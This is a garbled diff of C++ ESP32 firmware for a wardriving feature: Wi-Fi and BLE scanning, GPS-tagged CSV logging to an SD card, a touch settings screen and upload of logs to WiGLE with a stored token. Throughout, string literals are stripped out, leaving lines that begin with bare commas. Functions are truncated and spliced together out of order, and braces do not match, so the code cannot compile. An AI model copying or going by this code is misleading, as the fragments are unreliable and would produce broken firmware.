+    if (x > ix[0] && x < ix[0] + kWardIconSz) {
+      s_lastTbMs = t;
+      return 0;
+    }
+    if (x > ix[3] && x < ix[3] + kWardIconSz) {
+      s_lastTbMs = t;
+      return 3;
+    }
+    return -1;
+  }
+
+  wardLayoutSettingsButtons();
+  const int btnCount = featureHasTouchNavBar() ? kWardSetBtnCount : kWardSetBtnTotal;
+  const int h = FeatureUI::hit(s_wardSetBtns, btnCount, x, y);
+  if (h < 0) {
+    return -1;
+  }
+  return 10 + h;
+}
+
+static bool wardSessionShouldExit() {
+  if (feature_exit_requested) {
+    return true;
+  }
+  if (featureHasTouchNavBar()) {
+    
+    return isPhysicalButtonPressed(BTN_SELECT);
+  }
+  return isButtonPressed(BTN_SELECT) || touchRequestsExit();
+}
+
+void session() {
+  feature_exit_requested = false;
+
+  const bool bgWas = (s_bgTask != nullptr);
+
+  if (!bgWas && !isSDCardAvailable()) {
+    tft.fillScreen(FEATURE_BG);
+    drawStatusBar(readBatteryVoltage(), true, true);
+    wardLogClear();
+    wardLogPush(
+,
+                        BS::Primary,
+                        false};
+    s_wardSetBtns[8] = {(int16_t)(kWSetPad + halfW + kWSetGap),
+                        wigleY,
+                        halfW,
+                        (int16_t)kWSetBtnH,
+                        
+,
+                        BS::Secondary,
+                        false};
+  }
+}
+
+static void wardDrawSettingsPage() {
+  const int scrW = tft.width();
+  const int contentBottom = wardContentBottom();
+  const int pad = kWSetPad;
+  const int cardW = scrW - 2 * pad;
+  const WardSetLayout layout = wardComputeSetLayout();
+  char buf[96];
+  const bool fullPaint = !s_wardSetSnap.valid;
+  const bool radioDirty = fullPaint || s_editRadioMode != s_wardSetSnap.radio;
+  const bool intervalDirty = fullPaint || s_editScanMs != s_wardSetSnap.scanMs;
+  const bool maxDirty = fullPaint || s_editMaxAps != s_wardSetSnap.maxAps;
+
+  if (fullPaint) {
+    tft.fillRect(0, kWardBodyY, scrW, contentBottom - kWardBodyY, FEATURE_BG);
+  }
+  uiSetTextDatum(TL_DATUM);
+
+  wardLayoutSettingsButtons();
+
+  if (fullPaint) {
+    wardDrawSetHeader(pad, cardW, layout);
+  }
+
+  if (radioDirty) {
+    for (int i = 0; i < 3; ++i) {
+      FeatureUI::drawButton(s_wardSetBtns[i]);
+    }
+  }
+
+  if (intervalDirty) {
+    snprintf(buf, sizeof(buf), 
+,
+                      (s_editRadioMode == WardRadioMode::Ble) ? BS::Primary : BS::Secondary,
+                      false};
+  s_wardSetBtns[2] = {(int16_t)(kWSetPad + 2 * (bw3 + kWSetGap)),
+                      (int16_t)L.modeBtnY,
+                      bw3,
+                      (int16_t)kWSetBtnH,
+                      
+,
+                      (s_editRadioMode == WardRadioMode::Both) ? BS::Primary : BS::Secondary,
+                      false};
+
+  s_wardSetBtns[3] = {(int16_t)kWSetPad,
+                      (int16_t)L.intervalBtnY,
+                      bw2,
+                      (int16_t)kWSetBtnH,
+                      
+,
+                      (s_editRadioMode == WardRadioMode::WiFi) ? BS::Primary : BS::Secondary,
+                      false};
+  s_wardSetBtns[1] = {(int16_t)(kWSetPad + bw3 + kWSetGap),
+                      (int16_t)L.modeBtnY,
+                      bw3,
+                      (int16_t)kWSetBtnH,
+                      
+,
+                      BS::Secondary,
+                      false};
+
+  if (!featureHasTouchNavBar()) {
+    const int16_t wigleY = (int16_t)(L.capBtnY + kWSetBtnH + kWSetSectionGap);
+    s_wardSetBtns[7] = {(int16_t)kWSetPad,
+                        wigleY,
+                        halfW,
+                        (int16_t)kWSetBtnH,
+                        
+,
+                      BS::Secondary,
+                      false};
+
+  s_wardSetBtns[5] = {(int16_t)kWSetPad,
+                      (int16_t)L.capBtnY,
+                      bw2,
+                      (int16_t)kWSetBtnH,
+                      
+,
+                      BS::Secondary,
+                      false};
+  s_wardSetBtns[4] = {(int16_t)(kWSetPad + bw2 + kWSetGap),
+                      (int16_t)L.intervalBtnY,
+                      bw2,
+                      (int16_t)kWSetBtnH,
+                      
+,
+                      BS::Secondary,
+                      false};
+  s_wardSetBtns[6] = {(int16_t)(kWSetPad + bw2 + kWSetGap),
+                      (int16_t)L.capBtnY,
+                      bw2,
+                      (int16_t)kWSetBtnH,
+                      
+, (double)hdopLive);
+    } else {
+      logf.print(',');
+    }
+}
+
+static void wardDoWifiScanLog(File& logf, uint32_t now, uint32_t* linesWr, uint32_t* scanCt) {
+  WiFi.scanDelete();
+  const int n = WiFi.scanNetworks(false, true);
+  (*scanCt)++;
+  if (n <= 0) {
+    wardLogPush(
+, (double)navAltM);
+    } else {
+      logf.print(',');
+    }
+    logf.print((int)fixQuality);
+    logf.print(',');
+    logf.print((unsigned)satsUsedGga);
+    logf.print(',');
+    if (hdopLive >= 0.f) {
+      logf.printf(
+, (unsigned long)linesWr);
+  uiDrawString(buf, pad + kWardInnerPad, valueY);
+
+  const int x2 = pad + colW + colGap;
+  tft.fillRoundRect(x2, layout.statY, colW, layout.statH, kWardUiRadius, UI_FG);
+  tft.drawRoundRect(x2, layout.statY, colW, layout.statH, kWardUiRadius, UI_LINE);
+  uiSetTextColor(UI_ICON, UI_FG);
+  uiDrawString(
+, (unsigned long)millis());
+    logf = SD.open(path, FILE_WRITE);
+    if (!logf) {
+      if (wardWaitStartupFailureDismiss(
+, (unsigned long)millis());
+  strncpy(s_bgPath, path, sizeof(s_bgPath));
+
+  File logf = SD.open(path, FILE_WRITE);
+  if (!logf) {
+    s_bgPath[0] = '\0';
+    gpsSerial.end();
+    s_bgTask = nullptr;
+    vTaskDelete(nullptr);
+    return;
+  }
+  logf.println(
+      
+, (unsigned long)s_cfgScanMs,
+                        wardRadioModeShort((WardRadioMode)s_cfgRadioMode), (int)s_cfgMaxAps);
+          page = WardPage::Main;
+          wardSetNavLabels(page, bgOn, logOn);
+          wardUiInvalidateAll();
+          drainButtons();
+        }
+      } else {
+        if (hit == 0) {
+          wardLogPush(
+, (unsigned long)s_editScanMs);
+            }
+          } else if (bodyHit == 5) {
+            if (s_editMaxAps > 8) {
+              s_editMaxAps -= 4;
+              wardLogPushf(
+, (unsigned long)s_editScanMs);
+          }
+          } else if (bodyHit == 4) {
+          if (s_editScanMs < 20000u) {
+            s_editScanMs += 500u;
+              wardLogPushf(
+, (unsigned long)s_editScanMs);
+    wardDrawSetInlineCard(pad, cardW, layout.intervalCardY, 
+, (unsigned long)scans);
+  uiDrawString(buf, x2 + kWardInnerPad, valueY);
+  }
+
+  if (csvDirty) {
+  const int iconX = pad + kWardInnerPad;
+  const int textX = wardCardTextX(pad);
+  const int maxTextW = wardCardTextMaxW(pad, cardW);
+  const int iconY = wardCardIconY(layout.csvY, layout.csvH);
+  int rowY[2];
+  wardCardTextRowYs(layout.csvY, layout.csvH, 2, rowY);
+  tft.fillRoundRect(pad, layout.csvY, cardW, layout.csvH, kWardUiRadius, UI_FG);
+  tft.drawRoundRect(pad, layout.csvY, cardW, layout.csvH, kWardUiRadius, UI_LINE);
+  tft.drawBitmap(iconX, iconY, bitmap_icon_document_tag, kWardCardIconSz, kWardCardIconSz,
+                 UI_ICON);
+  uiSetTextFont(1);
+  uiSetTextColor(UI_ICON, UI_FG);
+  uiDrawString(
+, (unsigned)s_cfgScanMs, (int)s_cfgMaxAps);
+  uiSetTextColor(UI_DIM_TEXT, UI_FG);
+  uiDrawString(wardFitTextWidth(buf, maxTextW), radioTextX, row2Y);
+  }
+
+  const bool logPanelDirty = fullPaint || s_wardLogDirty;
+  if (logPanelDirty && layout.hintH >= 20) {
+    char snap[kWardLogLines][kWardLogCols + 1];
+    bool snapGreen[kWardLogLines];
+    uint32_t genSnap = 0;
+    taskENTER_CRITICAL(&s_wardLogMux);
+    memcpy(snap, s_wardLog, sizeof(snap));
+    memcpy(snapGreen, s_wardLogGreen, sizeof(snapGreen));
+    genSnap = s_wardLogGen;
+    taskEXIT_CRITICAL(&s_wardLogMux);
+
+    tft.fillRoundRect(pad, layout.hintY, cardW, layout.hintH, kWardUiRadius, UI_FG);
+    tft.drawRoundRect(pad, layout.hintY, cardW, layout.hintH, kWardUiRadius, UI_LINE);
+    uiSetTextFont(1);
+    uiSetTextDatum(TL_DATUM);
+    const int lx = pad + kWardInnerPad;
+    const int innerTop = layout.hintY + kWardInnerPad;
+    const int innerBot = layout.hintY + layout.hintH - kWardInnerPad;
+    const int innerH = innerBot - innerTop;
+    int linesToDraw = innerH / kWardLogLineH;
+    if (linesToDraw > kWardLogLines) {
+      linesToDraw = kWardLogLines;
+    }
+    if (linesToDraw < 1) {
+      linesToDraw = 1;
+    }
+    const int skip = kWardLogLines - linesToDraw;
+    const int blockH = linesToDraw * kWardLogLineH;
+    int ty = innerBot - blockH;
+    if (ty < innerTop) {
+      ty = innerTop;
+    }
+    for (int i = 0; i < linesToDraw; ++i, ty += kWardLogLineH) {
+      const int src = skip + i;
+      if (snap[src][0] == '\0') {
+        continue;
+      }
+      uiSetTextColor(snapGreen[src] ? UI_OK : UI_DIM_TEXT, UI_FG);
+      uiDrawString(snap[src], lx, ty);
+    }
+    taskENTER_CRITICAL(&s_wardLogMux);
+    if (s_wardLogGen == genSnap) {
+      s_wardLogDirty = false;
+    }
+    taskEXIT_CRITICAL(&s_wardLogMux);
+  }
+}
+
+static void wardLayoutSettingsButtons() {
+  using BS = FeatureUI::ButtonStyle;
+  const WardSetLayout L = wardComputeSetLayout();
+  const int16_t W = tft.width();
+  const int16_t bw3 = (int16_t)((W - 2 * kWSetPad - 2 * kWSetGap) / 3);
+  const int16_t bw2 = (int16_t)((W - 2 * kWSetPad - kWSetGap) / 2);
+  const int16_t halfW = (int16_t)((W - 2 * kWSetPad - kWSetGap) / 2);
+
+  s_wardSetBtns[0] = {(int16_t)kWSetPad,
+                      (int16_t)L.modeBtnY,
+                      bw3,
+                      (int16_t)kWSetBtnH,
+                      
+, (unsigned)satsUsedGga,
+             (double)hdopLive, (double)navAltM);
+  } else {
+    snprintf(buf, sizeof(buf), 
+, (unsigned)satsUsedGga,
+             hdopLive >= 0.f ? (double)hdopLive : -1.0);
+  }
+  uiDrawString(wardFitTextWidth(buf, maxTextW), textX, rowY[1]);
+  if (fix) {
+    snprintf(buf, sizeof(buf), 
+, 10240, &logf, 1, &s_fgScanTask, 0);
+  return ok == pdPASS;
+}
+
+static void wardStopForegroundScanTask() {
+  if (!s_fgScanTask) {
+    return;
+  }
+  s_fgScanStop = true;
+  for (int i = 0; i < 1200 && s_fgScanTask; i++) {
+    delay(10);
+  }
+  if (!s_fgScanTask) {
+    s_fgScanStop = false;
+  }
+}
+
+static void wardBgTask(void* ) {
+  lineLen = 0;
+  rowCount = 0;
+  lastGsvMs = 0;
+  lastNavMs = 0;
+  strncpy(utcStr, 
+, 10240, nullptr, 1, &s_bgTask, 0);
+  if (ok != pdPASS) {
+    s_bgTask = nullptr;
+    wardNotify(
+, DARK_GRAY, UI_DIM_TEXT);
+  }
+  if (bgMode) {
+    uiSetTextFont(1);
+    uiSetTextColor(UI_DIM_TEXT, UI_FG);
+    const int bgX = statusPillX - uiTextWidth(
+, GREEN, BLACK);
+  } else {
+    wardDrawPill(pillX, pillY, kWaitPillW, pillH, 
+, ORANGE, FEATURE_BG);
+  }
+  uiSetTextColor(UI_DIM_TEXT, UI_FG);
+  if (!isnan(navAltM) && fix) {
+    snprintf(buf, sizeof(buf), 
+, RED, WHITE);
+  } else {
+    wardDrawPill(statusPillX, pillY, kWardStatusPillW, 18, 
+, auth);
+  }
+}
+
+
+static int wardSplitWardCsvLine(char* line, char* fields[], int maxFields) {
+  bool inq = false;
+  char* start = line;
+  int nf = 0;
+  for (char* p = line; *p && nf < maxFields; ++p) {
+    if (*p == '
+, b64, err, sizeof(err));
+  up.close();
+  SD.remove(WARD_WIGLE_TMP_CSV);
+
+  WiFi.disconnect();
+  delay(120);
+
+  s_fgScanPaused = false;
+
+  if (ok) {
+    wardNotify(
+, bgX, innerY + 2);
+    }
+  }
+  }
+
+  if (statsDirty) {
+  const int colGap = 6;
+  const int colW = (cardW - colGap) / 2;
+  const int labelY = layout.statY + kWardInnerPad;
+  const int valueY = layout.statY + layout.statH - kWardInnerPad - 8;
+  tft.fillRoundRect(pad, layout.statY, colW, layout.statH, kWardUiRadius, UI_FG);
+  tft.drawRoundRect(pad, layout.statY, colW, layout.statH, kWardUiRadius, UI_LINE);
+  uiSetTextFont(1);
+  uiSetTextColor(UI_ICON, UI_FG);
+  uiDrawString(
+, bssid[0], bssid[1], bssid[2],
+               bssid[3], bssid[4], bssid[5]);
+    } else {
+      mac[0] = '\0';
+    }
+    wardLogPushWifiAp(ssidc, WiFi.channel(i), WiFi.RSSI(i), mac);
+    wardPrintCsvGpsPrefix(logf, now);
+    logf.print(
+, buf);
+    FeatureUI::drawButton(s_wardSetBtns[3]);
+    FeatureUI::drawButton(s_wardSetBtns[4]);
+  }
+
+  if (maxDirty) {
+    snprintf(buf, sizeof(buf), 
+, buf);
+    FeatureUI::drawButton(s_wardSetBtns[5]);
+    FeatureUI::drawButton(s_wardSetBtns[6]);
+  }
+
+  if (!featureHasTouchNavBar()) {
+    FeatureUI::drawButton(s_wardSetBtns[7]);
+    FeatureUI::drawButton(s_wardSetBtns[8]);
+  }
+}
+
+#ifndef WARD_WIGLE_CFG_PATH
+#define WARD_WIGLE_CFG_PATH 
+, d.getAddress().toString().c_str());
+    const std::string bleName = d.getName();
+    const char* namec = bleName.empty() ? 
+, err[0] ? err : 
+, navLat, navLon);
+    uiDrawString(wardFitTextWidth(buf, maxTextW), textX, rowY[2]);
+  } else {
+    uiDrawString(
+, navLat, navLon);
+    } else {
+      logf.print(
+, pad + kWardInnerPad, labelY);
+  uiSetTextColor(UI_TEXT, UI_FG);
+  snprintf(buf, sizeof(buf), 
+, pad, kWardBodyY + 18);
+  }
+
+  auto rowCard = [&](int idx, const char* label, const char* val, bool dim) {
+    const int y = kWigleFirstRowY + idx * (kWigleRowH + kWigleRowGap);
+    const int labelY = y + kWardInnerPad;
+    const int valueY = y + kWigleRowH - kWardInnerPad - 8;
+    const int valueMaxW = cardW - kWardInnerPad * 2;
+    tft.fillRoundRect(pad, y, cardW, kWigleRowH, kWardUiRadius, UI_FG);
+    tft.drawRoundRect(pad, y, cardW, kWigleRowH, kWardUiRadius, UI_LINE);
+    uiSetTextColor(dim ? UI_DIM_TEXT : UI_ICON, UI_FG);
+    uiDrawString(label, pad + kWardInnerPad, labelY);
+    uiSetTextColor(dim ? UI_DIM_TEXT : UI_TEXT, UI_FG);
+    const char* show = (val && val[0]) ? val : 
+, pad, kWardBodyY + 2);
+  uiSetTextFont(1);
+  uiSetTextColor(UI_DIM_TEXT, FEATURE_BG);
+  if (!featureHasTouchNavBar()) {
+    uiDrawString(
+, path);
+  }
+
+  s_editScanMs = s_cfgScanMs;
+  s_editMaxAps = s_cfgMaxAps;
+  s_editRadioMode = (WardRadioMode)s_cfgRadioMode;
+
+  wardUiInvalidateAll();
+  const bool initBgOn = (s_bgTask != nullptr);
+  wardSetNavLabels(page, initBgOn, fgLog);
+  uint32_t lastBarMs = millis();
+  lastUiMs = lastBarMs - (uint32_t)WARDRIVE_UI_INTERVAL_MS;
+
+  s_wardFgSessionForStatusBar = true;
+  drawStatusBar(readBatteryVoltage(), true, true);
+
+  while (true) {
+    gWardSuppressBottomTouchExit = (page != WardPage::Main);
+    wardPumpNavChrome();
+    if (wardSessionShouldExit()) {
+      break;
+    }
+    if (!bgWas) {
+      feedSerial();
+      const bool nf = (fixQuality > 0) && !isnan(navLat) && !isnan(navLon);
+      if (s_wardGpsFixLog < 0) {
+        s_wardGpsFixLog = (int8_t)(nf ? 1 : 0);
+      } else {
+        const int8_t pf = s_wardGpsFixLog;
+        const int8_t nowSt = (int8_t)(nf ? 1 : 0);
+        if (nowSt != pf) {
+          s_wardGpsFixLog = nowSt;
+          wardLogPush(nf ? 
+, s_editMaxAps);
+            }
+          } else if (bodyHit == 6) {
+            if (s_editMaxAps < 64) {
+              s_editMaxAps += 4;
+              wardLogPushf(
+, s_editMaxAps);
+            }
+          } else if (bodyHit == 7) {
+            if (s_bgTask) {
+              wardNotify(
+, s_editMaxAps);
+    wardDrawSetInlineCard(pad, cardW, layout.capCardY, 
+, s_wigPass, s_wigUseSavedWifi);
+  const int y4 = kWigleFirstRowY + 4 * (kWigleRowH + kWigleRowGap);
+  tft.fillRoundRect(pad, y4, cardW, kWigleRowH, kWardUiRadius, UI_FG);
+  tft.drawRoundRect(pad, y4, cardW, kWigleRowH, kWardUiRadius, UI_LINE);
+  uiSetTextColor(UI_TEXT, UI_FG);
+  const char* autoLine = s_wigUseSavedWifi ? 
+, s_wigPass, sizeof(s_wigPass), 63, false);
+            }
+          } else if (bh == 4) {
+            s_wigUseSavedWifi = !s_wigUseSavedWifi;
+            if (s_wigUseSavedWifi) {
+              s_wigSsid[0] = '\0';
+              s_wigPass[0] = '\0';
+            }
+            wardLogPush(s_wigUseSavedWifi ? 
+, s_wigSsid, s_wigUseSavedWifi);
+  rowCard(3, 
+, s_wigSsid, sizeof(s_wigSsid), 31, false);
+            }
+          } else if (bh == 3) {
+            if (s_wigUseSavedWifi) {
+              wardNotify(
+, s_wigTok, false);
+  rowCard(2, 
+, s_wigTok, sizeof(s_wigTok), 127, true);
+          } else if (bh == 2) {
+            if (s_wigUseSavedWifi) {
+              wardNotify(
+, s_wigUser, false);
+  rowCard(1, 
+, s_wigUser, sizeof(s_wigUser), 63, true);
+          } else if (bh == 1) {
+            wardWigleRunFieldEditor(
+, safePath);
+    }
+    uiDrawString(wardFitTextWidth(buf, maxTextW), textX, rowY[1]);
+  }
+  }
+
+  if (gpsDirty) {
+  const int iconX = pad + kWardInnerPad;
+  const int textX = wardCardTextX(pad);
+  const int iconY = wardCardIconY(layout.gpsY, layout.gpsH);
+  int rowY[3];
+  wardCardTextRowYs(layout.gpsY, layout.gpsH, 3, rowY);
+  constexpr int kFixPillW = 34;
+  constexpr int kWaitPillW = 40;
+  const int pillW = fix ? kFixPillW : kWaitPillW;
+  const int pillH = 16;
+  const int pillX = scrW - pad - pillW - 2;
+  const int pillY = rowY[0] + (kWardTextLineH - pillH) / 2;
+  const int maxTextW = wardCardTextMaxW(pad, cardW);
+  tft.fillRoundRect(pad, layout.gpsY, cardW, layout.gpsH, kWardUiRadius, UI_FG);
+  tft.drawRoundRect(pad, layout.gpsY, cardW, layout.gpsH, kWardUiRadius, UI_LINE);
+  tft.drawBitmap(iconX, iconY, bitmap_icon_satellite_dish, kWardCardIconSz, kWardCardIconSz,
+                 UI_ICON);
+  uiSetTextFont(1);
+  uiSetTextColor(UI_TEXT, UI_FG);
+  uiDrawString(
+, safePath, safePath + pathLen - 8);
+    } else {
+      snprintf(buf, sizeof(buf), 
+, sizeof(dateStr));
+    hdopLive = pdopLive = -1.f;
+    fixQuality = 0;
+    gsaFixMode = 1;
+    satsUsedGga = 0;
+    navLat = navLon = NAN;
+    navAltM = NAN;
+    rmcNavValid = false;
+    rowCount = 0;
+    lastGsvMs = 0;
+    lastNavMs = 0;
+
+    gpsSerial.end();
+    gpsSerial.begin(GPS_UART_BAUD, SERIAL_8N1, GPS_UART_RX, GPS_UART_TX);
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    delay(80);
+
+    snprintf(path, sizeof(path), 
+, sizeof(dateStr));
+  hdopLive = pdopLive = -1.f;
+  fixQuality = 0;
+  gsaFixMode = 1;
+  satsUsedGga = 0;
+  navLat = navLon = NAN;
+  navAltM = NAN;
+  rmcNavValid = false;
+
+  gpsSerial.end();
+  gpsSerial.begin(GPS_UART_BAUD, SERIAL_8N1, GPS_UART_RX, GPS_UART_TX);
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(80);
+
+  char path[48];
+  snprintf(path, sizeof(path), 
+, sizeof(utcStr));
+    strncpy(dateStr, 
+, sizeof(utcStr));
+  strncpy(dateStr, 
+, textX, innerY + 1);
+  constexpr int kWardStatusPillW = 40;
+  const int statusPillX = scrW - pad - kWardStatusPillW - 4;
+  const int pillY = layout.heroY + (layout.heroH - 18) / 2;
+  if (logOn) {
+    wardDrawPill(statusPillX, pillY, kWardStatusPillW, 18, 
+, textX, rowY[0]);
+  if (fix) {
+    wardDrawPill(pillX, pillY, kFixPillW, pillH, 
+, textX, rowY[0]);
+  uiSetTextColor(UI_DIM_TEXT, UI_FG);
+  if (!safePath[0]) {
+    uiDrawString(
+, textX, rowY[1]);
+  } else {
+    const size_t pathLen = strlen(safePath);
+    if (pathLen > 18u) {
+      snprintf(buf, sizeof(buf), 
+, textX, rowY[2]);
+  }
+  }
+
+  if (radioDirty) {
+  const int radioTextX = pad + 58;
+  const int maxTextW = cardW - (radioTextX - pad) - kWardInnerPad;
+  const int row1Y = layout.radioY + kWardInnerPad;
+  const int row2Y = layout.radioY + layout.radioH - kWardInnerPad - 8;
+  tft.fillRoundRect(pad, layout.radioY, cardW, layout.radioH, kWardUiRadius, UI_FG);
+  tft.drawRoundRect(pad, layout.radioY, cardW, layout.radioH, kWardUiRadius, UI_LINE);
+  const int radioIconY = layout.radioY + (layout.radioH - 16) / 2;
+  int ix = pad + kWardInnerPad;
+  if (rm == WardRadioMode::WiFi || rm == WardRadioMode::Both) {
+    tft.drawBitmap(ix, radioIconY, bitmap_icon_wifi, 16, 16, rm == WardRadioMode::WiFi ? ORANGE : UI_DIM_TEXT);
+    ix += 20;
+  }
+  if (rm == WardRadioMode::Ble || rm == WardRadioMode::Both) {
+    tft.drawBitmap(ix, radioIconY, bitmap_icon_ble, 16, 16, rm == WardRadioMode::Ble ? ORANGE : UI_DIM_TEXT);
+  }
+  uiSetTextFont(1);
+  uiSetTextColor(UI_TEXT, UI_FG);
+  uiDrawString(wardRadioModeShort(rm), radioTextX, row1Y);
+  snprintf(buf, sizeof(buf), 
+, x + w / 2, y + h / 2);
+  uiSetTextDatum(TL_DATUM);
+}
+
+struct WardMainLayout {
+  int heroY;
+  int statY;
+  int csvY;
+  int gpsY;
+  int radioY;
+  int hintY;
+  int heroH;
+  int statH;
+  int csvH;
+  int gpsH;
+  int radioH;
+  int hintH;
+};
+
+
+static WardMainLayout wardComputeMainLayout(int contentBottom) {
+  WardMainLayout L{};
+  const int bodyTop = kWardBodyY + 4;
+  const int bottomPad = 4;
+  const int gap = featureHasTouchNavBar() ? 3 : 5;
+  const bool compact = featureHasTouchNavBar();
+
+  L.heroH = compact ? 26 : 28;
+  L.statH = compact ? 30 : 34;
+  L.csvH = L.statH;
+  L.gpsH = compact ? 46 : 52;
+  L.radioH = compact ? 30 : 32;
+
+  L.heroY = bodyTop;
+  L.statY = L.heroY + L.heroH + gap;
+  L.csvY = L.statY + L.statH + gap;
+  L.gpsY = L.csvY + L.csvH + gap;
+  L.radioY = L.gpsY + L.gpsH + gap;
+  L.hintY = L.radioY + L.radioH + gap;
+  L.hintH = contentBottom - bottomPad - L.hintY;
+
+  const int minLogH = compact ? 88 : 76;
+  if (L.hintH < minLogH) {
+    L.hintH = minLogH;
+    L.hintY = contentBottom - bottomPad - L.hintH;
+    L.radioY = L.hintY - gap - L.radioH;
+    L.gpsY = L.radioY - gap - L.gpsH;
+    L.csvY = L.gpsY - gap - L.csvH;
+    L.statY = L.csvY - gap - L.statH;
+    L.heroY = L.statY - gap - L.heroH;
+    if (L.heroY < bodyTop) {
+      L.heroY = bodyTop;
+      L.statY = L.heroY + L.heroH + gap;
+      L.csvY = L.statY + L.statH + gap;
+      L.gpsY = L.csvY + L.csvH + gap;
+      L.radioY = L.gpsY + L.gpsH + gap;
+      L.hintY = L.radioY + L.radioH + gap;
+      L.hintH = contentBottom - bottomPad - L.hintY;
+    }
+  }
+  return L;
+}
+
+
+static void wardToolbarIconXs(WardPage page, int16_t xs[4]) {
+  const int W = tft.width();
+  const int sz = (int)kWardIconSz;
+  const int margin = 6;
+  const int gap = 10;
+
+  if (page == WardPage::Settings || page == WardPage::WigleCfg) {
+    xs[0] = (int16_t)margin;
+    xs[3] = (int16_t)(W - margin - sz);
+    xs[1] = -1;
+    xs[2] = -1;
+    return;
+  }
+
+  xs[3] = (int16_t)margin;
+  xs[2] = (int16_t)(W - margin - sz);
+  xs[1] = (int16_t)(xs[2] - gap - sz);
+  xs[0] = (int16_t)(xs[1] - gap - sz);
+  const int backRight = (int)xs[3] + sz;
+  if ((int)xs[0] < backRight + gap) {
+    const int clusterW = 3 * sz + 2 * gap;
+    int c0 = W - margin - clusterW;
+    const int minLeft = backRight + gap;
+    if (c0 < minLeft) {
+      c0 = minLeft;
+    }
+    xs[0] = (int16_t)c0;
+    xs[1] = (int16_t)(c0 + gap + sz);
+    xs[2] = (int16_t)(c0 + 2 * (gap + sz));
+  }
+}
+
+static void wardDrawIconToolbar(WardPage page, bool bgActive, bool logOn) {
+  const int scrW = tft.width();
+  int16_t ix[4];
+  wardToolbarIconXs(page, ix);
+  tft.drawLine(0, 19, scrW, 19, TFT_WHITE);
+  tft.fillRect(0, kWardIconRowY, scrW, kWardIconRowH, DARK_GRAY);
+  const int iy = kWardIconRowY;
+  if (page == WardPage::Settings || page == WardPage::WigleCfg) {
+    tft.drawBitmap(ix[0], iy, bitmap_icon_go_back, kWardIconSz, kWardIconSz, TFT_WHITE);
+    tft.drawBitmap(ix[3], iy, bitmap_icon_checks, kWardIconSz, kWardIconSz, TFT_WHITE);
+    tft.drawLine(0, kWardIconRowY + kWardIconRowH, scrW, kWardIconRowY + kWardIconRowH, ORANGE);
+    return;
+  }
+  const unsigned char* i0 = bitmap_icon_document_gear;
+  const unsigned char* i1 = logOn ? bitmap_icon_sign_forbidden : bitmap_icon_start;
+  const unsigned char* i2 = bgActive ? bitmap_icon_power : bitmap_icon_rss;
+  const unsigned char* i3 = bitmap_icon_go_back;
+  const unsigned char* const icons[4] = {i0, i1, i2, i3};
+  for (int i = 0; i < 4; i++) {
+    uint16_t col = TFT_WHITE;
+    if (i == 1 && logOn) {
+      col = RED;
+    } else if (i == 2 && bgActive) {
+      col = ORANGE;
+    }
+    tft.drawBitmap(ix[i], iy, icons[i], kWardIconSz, kWardIconSz, col);
+  }
+  tft.drawLine(0, kWardIconRowY + kWardIconRowH, scrW, kWardIconRowY + kWardIconRowH, ORANGE);
+}
+
+static void wardDrawBody(uint32_t linesWr, uint32_t scans, const char* path, bool logOn,
+                         bool bgMode) {
+  const int scrW = tft.width();
+  const int contentBottom = wardContentBottom();
+  const int pad = kWSetPad;
+  const int cardW = scrW - 2 * pad;
+  const WardMainLayout layout = wardComputeMainLayout(contentBottom);
+  char buf[128];
+
+  const bool fullPaint = !s_wardMainSnap.valid;
+  const char* safePath = path ? path : 
+, x2 + kWardInnerPad, labelY);
+  uiSetTextColor(UI_TEXT, UI_FG);
+  snprintf(buf, sizeof(buf), 
+----esp32divWigle7aF3
+--\r\n
+;
+
+  File logf;
+  bool fgFile = false;
+
+  if (!bgWas) {
+    lineLen = 0;
+    strncpy(utcStr, 
+;
+    for (; *p && *q; ++p, ++q) {
+      if (tolower((unsigned char)*p) != tolower((unsigned char)*q)) {
+        break;
+      }
+    }
+    autoWifi = (*p == '\0' && *q == '\0');
+  }
+  if (autoWifi) {
+    s_wigUseSavedWifi = true;
+    s_wigSsid[0] = '\0';
+    s_wigPass[0] = '\0';
+  }
+  wardWigleSanitizeOneLine(s_wigUser);
+  wardWigleSanitizeOneLine(s_wigTok);
+  wardWigleSanitizeOneLine(s_wigSsid);
+  wardWigleSanitizeOneLine(s_wigPass);
+  s_wigleCfgDirty = true;
+}
+
+static bool wardWigleEnsureConfigDir() {
+  if (!isSDCardAvailable()) {
+    return false;
+  }
+  if (SD.exists(
+;
+    uiDrawString(wardFitTextWidth(show, valueMaxW), pad + kWardInnerPad, valueY);
+  };
+
+  rowCard(0, 
+;
+  cfg.enableShuffle = false;
+  cfg.requireNonEmpty = requireNonEmpty;
+  cfg.emptyErrorMsg = requireNonEmpty ? 
+;
+  cfg.middleLabel = 
+;
+  cfg.okLabel = 
+;
+  const String init = String(buf);
+  const OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, init);
+  s_fgScanPaused = false;
+  if (r.accepted) {
+    strncpy(buf, r.text.c_str(), cap - 1);
+    buf[cap - 1] = '\0';
+  }
+  wardUiInvalidateAll();
+  wardDrawWigleCfgPage();
+  wardSetNavLabels(WardPage::WigleCfg);
+  wardDrawIconToolbar(WardPage::WigleCfg, s_bgTask != nullptr, false);
+  wardPumpNavChrome();
+  s_lastWardInputMs = millis();
+}
+
+static constexpr int kWigleRowH = 30;
+static constexpr int kWigleRowGap = 4;
+static constexpr int kWigleFirstRowY = kWardBodyY + 34;
+
+static int wardWigleHitBodyRow(int x, int y) {
+  if (x < 8 || x >= tft.width() - 8) {
+    return -1;
+  }
+  const int ry = y - kWigleFirstRowY;
+  const int step = kWigleRowH + kWigleRowGap;
+  if (ry < 0 || step <= 0) {
+    return -1;
+  }
+  const int idx = ry / step;
+  if (idx < 0 || idx > 4) {
+    return -1;
+  }
+  const int within = ry - idx * step;
+  if (within > kWigleRowH) {
+    return -1;
+  }
+  return idx;
+}
+
+static void wardDrawWigleCfgPage() {
+  const int scrW = tft.width();
+  const int contentBottom = wardContentBottom();
+  const int pad = kWSetPad;
+  const int cardW = scrW - 2 * pad;
+  tft.fillRect(0, kWardBodyY, scrW, contentBottom - kWardBodyY, FEATURE_BG);
+  uiSetTextDatum(TL_DATUM);
+  uiSetTextFont(2);
+  uiSetTextColor(UI_TEXT, FEATURE_BG);
+  uiDrawString(
+;
+  const bool heroDirty = fullPaint || logOn != s_wardMainSnap.logOn || bgMode != s_wardMainSnap.bgMode;
+  const bool statsDirty = fullPaint || linesWr != s_wardMainSnap.lines || scans != s_wardMainSnap.scans;
